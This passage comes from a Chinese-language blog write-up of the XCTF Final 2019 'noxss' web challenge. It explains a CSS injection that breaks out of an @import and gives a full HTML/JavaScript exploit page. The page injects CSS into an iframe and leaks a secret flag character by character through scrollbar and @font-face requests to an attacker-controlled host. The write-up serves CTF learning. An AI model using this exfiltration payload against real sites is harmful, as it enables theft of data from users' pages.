class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0<span class="hljs-selector-tag">a</span>){}<span class="hljs-selector-tag">body</span>{<span class="hljs-attribute">background</span>:red}%2<span class="hljs-selector-tag">f</span>*</span><br></pre></td></tr></tbody></table></figure><p></p><p>对于以上，问了 @zsx 师傅，以下是他的原话（<del>你看看这是人说的吗</del>orz）：</p><blockquote><p>​ 我wp写了，看了下w3c标准，再随便fuzz一下就ok了</p></blockquote><p>我的理解是这里用<code>%0a</code>进行了换行，但是由于括号的解析还没结束，所以我们需要用<code>)</code>来将<code>import</code>的括号进行闭合，然后再用<code>{}</code>制定空样式，后面就可以任意注入 css 代码了。</p><p>如果有师傅看了 chromium 有非常硬核的理解，还望不吝赐教，带带我这个菜鸡。//感觉本文的关键点也不在这</p><p>然后我们就可以利用 token2 的方法，利用滚动条来 leak secret 了，只要自己做个 iframe 引用我们构造的 payload 即可，比如</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">//const chars = ['t','f']</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> chars = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'</span>.split(<span class="hljs-string">''</span>)</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> ff = [],</span></span><br><span class="line"><span class="hljs-actionscript">            data = <span class="hljs-string">''</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> prefix = <span class="hljs-string">'xctf{'</span></span></span><br><span class="line"><span class="hljs-javascript">        chars.forEach(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">var</span> css = <span class="hljs-string">''</span></span></span><br><span class="line"><span class="hljs-actionscript">            css = <span class="hljs-string">'?theme=../../../../\fa{}){}'</span></span></span><br><span class="line">            css +=</span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-string">`body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://172.16.71.138:9999/?<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(prefix+c)}</span>)}`</span></span></span><br><span class="line"><span class="hljs-javascript">            css += <span class="hljs-string">`@font-face{font-family:a<span class="hljs-subst">${c.charCodeAt()}</span>;src:url(http://172.16.71.138:23460/font/<span class="hljs-subst">${prefix}</span>/<span class="hljs-subst">${c}</span>);}`</span></span></span><br><span class="line"><span class="hljs-javascript">            css += <span class="hljs-string">`script{font-family:a<span class="hljs-subst">${c.charCodeAt()}</span>;display:block}`</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-string">'&lt;iframe scrolling=yes samesite src="http://127.0.0.1/noxss.php?theme='</span> +</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">encodeURIComponent</span>(css) +</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-string">'" style="width:1000000px" onload="event.target.style.width=\'100px\'"&gt;&lt;/iframe&gt;'</span>)</span></span><br><span class="line">        })</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002617.png" alt=""></p><p>And…</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191121002928.png" alt=""></p><p>现场做出来的真是 CSS 带师 orz…</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank" rel="noopener">XCTF final 2019 Writeup By ROIS</a></p><p><a href="https://www.smi1e.top/通过css注入窃取html中的数据/" target="_blank" rel="noopener">通过CSS注入窃取HTML中的数据</a></p><p><a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/" target="_blank" rel="noopener">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a></p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/12/05/HTTP-Smuggling/">一篇文章带你读懂 HTTP Smuggling 攻击</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/11/14/XCTF-Final-2019/">XCTF Final 2019 Web Write Up</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>